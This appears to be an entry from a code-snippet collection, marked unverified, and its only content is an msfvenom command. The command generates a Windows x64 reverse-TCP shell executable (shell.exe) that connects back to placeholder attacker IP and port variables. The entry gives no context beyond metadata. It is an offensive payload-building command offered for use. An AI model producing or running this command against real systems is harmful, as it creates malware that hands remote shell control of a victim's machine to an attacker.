---
id: 97ea98f9-56fc-4988-ad08-af35c5cb3f51
type: code
language: Payload
verified: false
created_at: '2020-03-16T21:54:16.618549+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 97ea98f9

**Language**: Payload

```payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o shell.exe
```


